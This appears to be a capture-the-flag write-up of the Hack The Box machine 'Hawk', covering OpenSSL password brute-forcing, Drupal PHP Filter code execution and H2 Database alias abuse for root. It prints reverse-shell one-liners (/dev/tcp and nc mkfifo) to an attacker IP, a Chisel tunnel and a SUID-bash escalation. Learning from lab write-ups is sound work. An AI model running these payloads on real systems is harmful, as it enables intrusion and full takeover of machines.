---
layout: post
title:  "Hawk Writeup - Hack The Box"
date:   2023-12-02
desc: "OpenSSL Cracking, Drupal Exploitation, H2 Database Exploitation"
keywords: "HTB,eJPT,eWPT,OpenSSL,Drupal,H2Database,Easy"
categories: [HTB]
tags: [HTB,eJPT,eWPT,Linux,OpenSSL,Drupal,H2Database,Easy]
icon: icon-htb
---

> **Disclaimer:** The ***writeups*** that I do on the different machines that I try to vulnerate, cover all the actions that I perform, even those that could be considered wrong, I consider that they are an essential part of the **learning curve** to become a **good professional**. So it can become very extensive content, if you are looking for something more direct, you should look for another site, there are many and of higher quality and different resolutions, moreover, I advocate that it is part of learning to consult different sources, to obtain greater expertise.

I continue with this little saga of **Linux** boxes, a nice one, **Hawk**, in which  [Hack The Box](https://www.hackthebox.com/){:target="_blank"} allows me to play a little with **Drupal** and **H2 Database**. While the machine is **medium**, you should always try to make the most of these challenges to exploit vulnerabilities in different ways and even use these environments to practice scripting and enumeration.

<br/><br/>
<img src="{{ site.img_path }}/hawk_writeup/Hawk.png" width="100%" style="margin: 0 auto;display: block
; max-width: 400px;">
<br/><br/>

I always count with the **[htbExplorer](https://github.com/s4vitar/htbExplorer){:target="_blank"}** script to deploy the box in my environment, I check that I have a correct communication with the victim machine and you can use `nmap` to know which ports using **TCP** as protocols, I will have to try to breach to access the box. There are several well known ports such as **HTTP**, **FTP**, **SSH** and others not so well known.

```bash
./htbExplorer -d Hawk
```

```bash
ping -c 1 10.10.10.102
python3 /usr/bin/whichSystem.py 10.10.10.102
sudo nmap -sS --min-rate 5000 -p- --open -vvv -n -Pn 10.10.10.102 -oG allPorts
```
<br/>
<img src="{{ site.img_path }}/hawk_writeup/Hawk_00.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/><br/>

I use the port scanning tool par excellence, `nmap`, and with its basic scripts I can learn more in depth about the versions of the services I am dealing with. A great piece of information that leakes me, is that I can access with ftp without authentication credentials and also, that it has a **Drupal CMS** and also, it is very likely that the **codename** is a **Bionic**.

```bash
nmap -sCV -p21,22,80,5435,8082,9092 10.10.10.102 -oN targeted

cat targeted
# vsftpd 3.0.3
# duckduckgo.com --> vsftpd 3.0.3 launchpad                 ??

# OpenSSH 7.6p1 Ubuntu 4
# duckduckgo.com --> OpenSSH 7.6p1 4 launchpad              Bionic!

# Apache httpd 2.4.29
# Apache 2.4.29 launchpad                                   Bionic!

# --> Annonymous FTP login allowed
# --> Drupal 7
# --> 8082/tcp H2 database http console
```

<br/>
<img src="{{ site.img_path }}/hawk_writeup/Hawk_01.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/hawk_writeup/Hawk_02.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/><br/>

I can access via **FTP**, and list the resources that are being shared, but so far I can't find anything. If I try to upload a file, I don't have the necessary permissions, I do this thinking of uploading a malicious file and then accessing it from the browser. But if I list also hidden files, I find one, I download it successfully and if I see its content, it seems that it is using **Base64** encoding, I will see it more in detail later, now I will focus on the web service on Port **80**.


```bash
ftp 10.10.10.102
  > dir
  > cd messages
  > put test.txt
  > ls -la
  > mget .drupal.txt.enc

file .drupal.txt.enc
# --> openssl enc'd data with salted password, base64 encoded

cat .drupal.txt.enc
```

<br/>
<img src="{{ site.img_path }}/hawk_writeup/Hawk_03.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/hawk_writeup/Hawk_04.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/><br/>

If I filter for ports that use **HTTP**, I can use `whatweb` and see what technologies the systems or services are using. At the time I'm making this box, the latest version of Drupal is **10**, and the victim machine has **7**, so it must have several vulnerabilities. The other **H2 Database** service I'm going to leave for later, in case I can't use **Drupal** to access the victim machine. I use `nmap` to find interesting files and directories in **Drupal**, but nothing interesting that I can use.

> **[Drupal](https://www.drupal.org/about){:target="_blank"}** is content management software. It's used to make many of the websites and applications you use every day. Drupal has great standard features, like easy content authoring, reliable performance, and excellent security. But what sets it apart is its flexibility; modularity is one of its core principles. Its tools help you build the versatile, structured content that dynamic web experiences need.

```bash
cat ../nmap/targeted | grep http
whatweb http://10.10.10.102 http://10.10.10.102:8082

nmap --script http-enum -p80 10.10.10.102 -oN webScan
```

<br/>
<img src="{{ site.img_path }}/hawk_writeup/Hawk_05.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/hawk_writeup/Hawk_06.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/hawk_writeup/Hawk_07.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/hawk_writeup/Hawk_08.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/><br/>

To access **Drupal** I need the credentials, and I think the best option is the file encrypted with **OpenSSL**. If I use `base64` to decode it and see its content, it is unreadable. So it is practically sure that it was encrypted with **OpennSSL** using some known encryption algorithm. If I search on the internet for: **"openssl decrypt encrypted file"**, I find many resources so I go through until I find **[https://www.geeksforgeeks.org/blockchain-encrypt-decrypt-files-with-password-using-openssl/]{:target="_blank"}** that explains and gives me what I need. I make a couple of tests to encrypt and decrypt a file, what I need is the password, then I create a script to perform a brute force attack and I can get the password and then the contents of the protected file.

```bash
openssl aes-256-cbc -in test.txt -out test.enc -k olddboy123
openssl aes-256-cbc -d -in test.enc -out test1.txt -k olddboy123

locate rockyou.txt
cat .drupal.txt.enc | tr -d '\n' | base64 -d > drupal.encrypted

nvim brute_force_ssl.sh
./brute_force_ssl.sh
```

> **brute_force_ssl.sh**

```bash
#!/bin/bash

function ctrl_c(){
  echo -e "\n\n[!] Exiting ...\n"
  tput cnorm; exit 1
}

# Ctrl+c
trap ctrl_c INT

tput civis
for password in $(cat /usr/share/wordlists/rockyou.txt); do
  openssl aes-256-cbc -d -in drupal.encrypted -out drupal.decrypted -k $password &>/dev/null

  if [ "$(echo $?)" == "0" ]; then
    echo -e "\n[+] The password is $password\n"
    exit 0
  fi
done
tput cnorm
```

<br/>
<img src="{{ site.img_path }}/hawk_writeup/Hawk_09.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/hawk_writeup/Hawk_10.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/hawk_writeup/Hawk_11.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/hawk_writeup/Hawk_12.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/><br/>

If I try accessing the **Drupal Administration Panel** with the credentials I obtained, and I can start researching vulnerabilities that I can exploit in this **CMS**. One of my favorite resources explains in detail how to execute commands on the victim machine, **[Drupal-HackTricks](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/drupal){:target="_blank"}**. I just have to enable the **PHP Filter** module and then create a new **Content** (**Article**, **Basic Page**) with the malicious command, choose the **PHP Code** format and preview. I test by sending me a packet with `ping` from the victim's machine and I receive the connection on my host.

```php
<?php system('ping -c 1 10.10.14.15'); ?>
```

```bash
tcpdump -i tun0 icmp -n
```

<br/>
<img src="{{ site.img_path }}/hawk_writeup/Hawk_13.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/hawk_writeup/Hawk_14.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/hawk_writeup/Hawk_15.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/hawk_writeup/Hawk_16.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/hawk_writeup/Hawk_17.png" width="100%" style="margin: 0 auto;display: block
<br/>
<img src="{{ site.img_path }}/hawk_writeup/Hawk_18.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/hawk_writeup/Hawk_19.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/><br/>

Now that I know that I have an **RCE** and I have connectivity with the machine, I can look for a **Reverse Shell**, there is a list of commands using different binaries in **[Pentestmonkey](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet){:target="_blank"}**, if I try each one of them surely one of them will work, and I got one that does not have many special characters and it is a binary that is not commonly related to the deployment of a shell. Since I accessed to the victim machine, I make a console treatment to have a better scrolling and visualization, since it is necessary to adjust the number of rows and columns of the shell that I obtained.

```bash
nc -nlvp 443
```

```bash
bash -i >& /dev/tcp/10.10.14.15/443 0>&1
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.15 443 >/tmp/f
```

```bash
script /dev/null -c bash            # [Ctrl+z]
stty raw -echo; fg
reset xterm
export TERM=xterm
export SHELL=bash
stty rows 29 columns 128
```

<br/>
<img src="{{ site.img_path }}/hawk_writeup/Hawk_20.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/hawk_writeup/Hawk_21.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/hawk_writeup/Hawk_22.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/hawk_writeup/Hawk_23.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/><br/>

If I use some basic recognition commands, I confirm that the codename is **Bionic**, and I already have access to the first flag. I find that the `pkexec` binary has **SUID** permissions, which would allow to use **[PwnKit](https://github.com/ly4k/PwnKit){:target="_blank"}** and elevate privileges, but I will try another way. If I look at **Cron** tasks or Capabilities I don't find any possible attack vector either, if I list all the open ports, I remember I had problems accessing port **8082** from my attacking machine.

```bash
id
groups
find \-perm -4000 2>/dev/null
getcap -r / 2>/dev/null
```

<br/>
<img src="{{ site.img_path }}/hawk_writeup/Hawk_24.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/hawk_writeup/Hawk_25.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/hawk_writeup/Hawk_26.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/hawk_writeup/Hawk_27.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/><br/>

What I am going to do is to bring that port to my machine using a tunnel with **[Chisel](https://github.com/jpillora/chisel){:target="_blank"}**, an excellent tool to access internal ports that cannot be accessed. If I download the binary on my machine and send it to the victim machine as well, I can create a server on my host and the client on the box. Now I can access from my browser to port **8082** which is actually connected to port **8082** on the machine I am enumerating.

> **Attacker Machine**:

```bash
python3 -m http.server 80

./chisel server 1234 --reverse --port 1234
```

> **Victime Machine**:

```bash
cd /dev/shm
wget 10.10.14.15/chisel
chmod +x chisel

netstat -nat | grep "8082"

./chisel client 10.10.14.15:1234 R:8082:127.0.0.1:8082
```

<br/>
<img src="{{ site.img_path }}/hawk_writeup/Hawk_28.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/hawk_writeup/Hawk_29.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/><br/>

If I access from the browser there is something that catches my attention, is that I can modify the **Preferences**, and if I enable connections from other computers I can access the **H2 Database** service without the need to use **[Chisel](https://github.com/jpillora/chisel){:target="_blank"}**.

<br/>
<img src="{{ site.img_path }}/hawk_writeup/Hawk_30.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/hawk_writeup/Hawk_31.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/hawk_writeup/Hawk_32.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/><br/>

If I search with `searchsploit` for any exploit for **H2 Database**, I find a few, but the first one in the list allows me to execute command execution, something that looks very good. But trying to exploit some vulnerability, I will test the connection with different **JDBC URL**, and everything works correctly, I can continue with the exploit phase.

> **[H2](https://en.wikipedia.org/wiki/H2_(database)){:target="_blank"}** is a relational database management system written in Java. It can be embedded in Java applications or run in client-server mode. The software is available as open source software Mozilla Public License 2.0 or the original Eclipse Public License.

> **Java Database Connectivity (JDBC)** is an application programming interface (API) for the Java programming language which defines how a client may access a database.

```bash
searchsploit H2 Database
```

<br/>
<img src="{{ site.img_path }}/hawk_writeup/Hawk_33.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/hawk_writeup/Hawk_34.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/hawk_writeup/Hawk_35.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/hawk_writeup/Hawk_36.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/><br/>

In this case it is not necessary to use the `exploit`, to know a little more in depth the vulnerability that will allow me to escalate privileges, I read the resource that is shared with me in the exploit, **[Abusing H2 Database ALIAS](https://mthbernardes.github.io/rce/2018/03/14/abusing-h2-database-alias.html){:target="_blank"}**. I just read carefully the explanation and understand the concepts that are being explained and continue. It is only necessary to connect to **H2 Database** with a **JDBC URL** that **I create** and inject a query that they share with me in the web page, I try to get a command execution, and as I already see on the screen the output I am looking for, it is only necessary to change in the victim machine the SUID permission to the `bash`. Then from console and in the victim machine I obtain a `bash` shell with the privileges of its owner, `root`. I was able to **rooted** this beautiful box of **Hack The Box**.

```sql
CREATE ALIAS EXECVE AS $$ String execve(String cmd) throws java.io.IOException { java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter("\\\\A"); return s.hasNext() ? s.next() : "";  }$$;

CALL EXECVE('id')

CALL EXECVE('whoami')

CALL EXECVE('chmod u+s /bin/bash')
```

```bash
bash -p
```

<br/>
<img src="{{ site.img_path }}/hawk_writeup/Hawk_37.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/hawk_writeup/Hawk_38.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/hawk_writeup/Hawk_39.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/hawk_writeup/Hawk_40.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/hawk_writeup/Hawk_41.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/hawk_writeup/Hawk_42.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/><br/>

> I always like these machines where you learn or reinforce concepts, although **Drupal** had a very old version with well known vulnerabilities, it gives you the overview of how to start looking for new **CVE** and exploit for the latest versions. Also with **H2 Database** there should be new ways to enumerate or even exploit it. I think it is time to keep practicing a lot and never lose the motivation to learn something new, there is a long way to go, I kill the box and go my way.

```bash
./htbExplorer -k Hawk
```
